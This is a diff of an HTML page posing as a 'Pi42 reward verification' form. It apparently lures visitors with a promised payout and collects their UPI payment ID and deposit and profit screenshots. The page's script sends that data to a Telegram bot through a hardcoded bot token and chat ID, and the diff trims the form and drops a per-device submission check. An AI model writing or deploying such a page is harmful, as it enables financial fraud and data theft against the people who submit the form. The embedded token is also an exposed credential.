@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Pi42 Reward Verification</title>
+<title>Pi42 Verification</title>
 
 <style>
 
@@ -13,12 +13,12 @@ background:#ede7f6;
 }
 
 .top{
-height:140px;
+height:120px;
 background:#673ab7;
 }
 
 .wrap{
-max-width:780px;
+max-width:760px;
 margin:auto;
 margin-top:-70px;
 padding:15px;
@@ -26,40 +26,31 @@ padding:15px;
 
 .card{
 background:#fff;
-border-radius:14px;
 padding:22px;
+border-radius:14px;
 margin-bottom:20px;
 box-shadow:0 2px 10px rgba(0,0,0,.15);
 }
 
 .title{
-font-size:34px;
+font-size:30px;
 font-weight:bold;
-}
-
-.req{
-color:red;
-}
-
-input{
-width:100%;
-padding:14px;
-border:1px solid #ccc;
-border-radius:10px;
-font-size:17px;
-margin-top:10px;
-box-sizing:border-box;
 }
 
 .demo{
 width:100%;
 border-radius:10px;
-margin-top:14px;
-border:1px solid #ddd;
+margin-top:15px;
 }
 
-.file{
-margin-top:15px;
+input{
+width:100%;
+padding:14px;
+font-size:17px;
+border:1px solid #ccc;
+border-radius:10px;
+margin-top:10px;
+box-sizing:border-box;
 }
 
 button{
@@ -68,20 +59,15 @@ padding:18px;
 background:#673ab7;
 border:none;
 border-radius:12px;
-color:#fff;
 font-size:20px;
+color:#fff;
 font-weight:bold;
-cursor:pointer;
 }
 
 .success{
 display:none;
 text-align:center;
 padding:40px;
-}
-
-.success img{
-width:220px;
 }
 
 </style>
@@ -103,20 +89,17 @@ Pi42 reward verification form
 
 <p>
 ⚠️ Follow demo screenshots.<br>
-⚠️ Wrong data may be rejected.<br>
-⚠️ Clear screenshots upload करें।
+⚠️ Wrong data may be rejected.
 </p>
 
 </div>
 
 <div class="card">
 
-<label>
-Coupling Tracking UPI ID
-<span class="req">*</span>
-</label>
+<h3>Coupling Tracking UPI ID *</h3>
 
-<input id="upi"
+<input
+id="upi"
 placeholder="example@ybl">
 
 </div>
@@ -125,10 +108,11 @@ placeholder="example@ybl">
 
 <h3>Deposit Screenshot *</h3>
 
-<img class="demo"
+<img
+class="demo"
 src="https://i.ibb.co/JRQL9qfn/IMG-20260528-054229.jpg">
 
-<input class="file"
+<input
 type="file"
 id="deposit">
 
@@ -138,38 +122,13 @@ id="deposit">
 
 <h3>Profit Screenshot *</h3>
 
-<img class="demo"
+<img
+class="demo"
 src="https://i.ibb.co/qL8NKhHf/IMG-20260527-180708.jpg">
 
-<input class="file"
+<input
 type="file"
 id="profit">
-
-</div>
-
-<div class="card">
-
-<h3>Trade Screenshot *</h3>
-
-<img class="demo"
-src="https://i.ibb.co/d06VMVMy/IMG-20260527-180629.jpg">
-
-<input class="file"
-type="file"
-id="trade">
-
-</div>
-
-<div class="card">
-
-<h3>P&L Screenshot *</h3>
-
-<img class="demo"
-src="https://i.ibb.co/yBg7tnML/IMG-20260527-180726.jpg">
-
-<input class="file"
-type="file"
-id="pnl">
 
 </div>
 
@@ -185,86 +144,79 @@ SUBMIT
 
 </div>
 
-<div class="success" id="success">
+<div
+class="success"
+id="success">
 
-<img src="https://media.tenor.com/xVfFIHxAzW4AAAAi/check.gif">
+<img
+width="220"
+src="https://media.tenor.com/xVfFIHxAzW4AAAAi/check.gif">
 
 <h1>
-🎉 Congratulations!
+🎉 Congratulations
 </h1>
 
-<h2>
-Verification Submitted Successfully
-</h2>
-
 <p>
-Within 12 hours verification & payment process
-complete ho jayega.
+Within 12 hours verification & payment process complete ho jayega.
 </p>
 
 </div>
 
 <script>
 
-if(localStorage.getItem("done")){
-
-document.body.innerHTML=
-"<div style='font-family:Arial;text-align:center;padding:50px'><h1>❌ Form Already Submitted</h1><h3>This device already used.</h3></div>";
-
-}
-
 function submitForm(){
 
 let upi=
-document.getElementById("upi").value;
+document.getElementById(
+"upi"
+).value;
 
 if(!upi){
 
-alert("UPI required");
+alert(
+"UPI Required"
+);
 
 return;
 
 }
 
-localStorage.setItem("done","yes");
+document.getElementById(
+"main"
+).style.display=
+"none";
 
-document.getElementById("main").style.display="none";
-
-document.getElementById("success").style.display="block";
+document.getElementById(
+"success"
+).style.display=
+"block";
 
 }
 
-
+</script>
 <script>
 
-const BOT_TOKEN =
+const BOT_TOKEN=
 "8765179938:AAGXVwRkDlNUfHwsIaQEkXJtrtfay3bjBOw";
 
-const CHAT_ID =
+const CHAT_ID=
 "7468352847";
-
-if(localStorage.getItem("done")){
-
-document.body.innerHTML=
-"<div style='font-family:Arial;text-align:center;padding:50px'><h1>❌ Form Already Submitted</h1><h3>This device already used.</h3></div>";
-
-}
 
 async function sendPhoto(file,caption){
 
-let formData = new FormData();
+let fd=new FormData();
 
-formData.append(
+fd.append(
 "chat_id",
 CHAT_ID
 );
 
-formData.append(
+fd.append(
 "caption",
 caption
 );
 
-formData.append(
+fd.append(
 "photo",
 file
 );
@@ -273,74 +225,62 @@ await fetch(
 `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
 {
 method:"POST",
-body:formData
+body:fd
 });
 
 }
 
-async function submitForm(){
+async function telegramSubmit(){
 
 let upi=
-document.getElementById("upi").value;
+document.getElementById(
+"upi"
+).value;
 
 let deposit=
-document.getElementById("deposit").files[0];
+document.getElementById(
+"deposit"
+).files[0];
 
 let profit=
-document.getElementById("profit").files[0];
-
-let trade=
-document.getElementById("trade").files[0];
-
-let pnl=
-document.getElementById("pnl").files[0];
-
-if(!upi){
-
-alert("UPI Required");
-
-return;
-
-}
+document.getElementById(
+"profit"
+).files[0];
 
 if(
+!upi||
 !deposit||
-!profit||
-!trade||
-!pnl
+!profit
 ){
 
 alert(
-"All screenshots required"
+"Fill all fields + screenshots"
 );
 
 return;
 
 }
 
-let btn =
-document.querySelector("button");
-
-btn.innerText =
-"Submitting...";
-
-btn.disabled=true;
-
 await fetch(
 `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
 {
 method:"POST",
+
 headers:{
-'Content-Type':
-'application/json'
+"Content-Type":
+"application/json"
 },
+
 body:JSON.stringify({
+
 chat_id:CHAT_ID,
+
 text:
-`🚀 NEW FORM SUBMISSION
+`🚀 NEW FORM
 
 UPI:
 ${upi}`
+
 })
 }
 );
@@ -355,32 +295,8 @@ profit,
 "Profit Screenshot"
 );
 
-await sendPhoto(
-trade,
-"Trade Screenshot"
-);
-
-await sendPhoto(
-pnl,
-"P&L Screenshot"
-);
-
-localStorage.setItem(
-"done",
-"yes"
-);
-
-document.getElementById(
-"main"
-).style.display="none";
-
-document.getElementById(
-"success"
-).style.display="block";
-
 }
 
 </script>
-
 </body>
 </html>
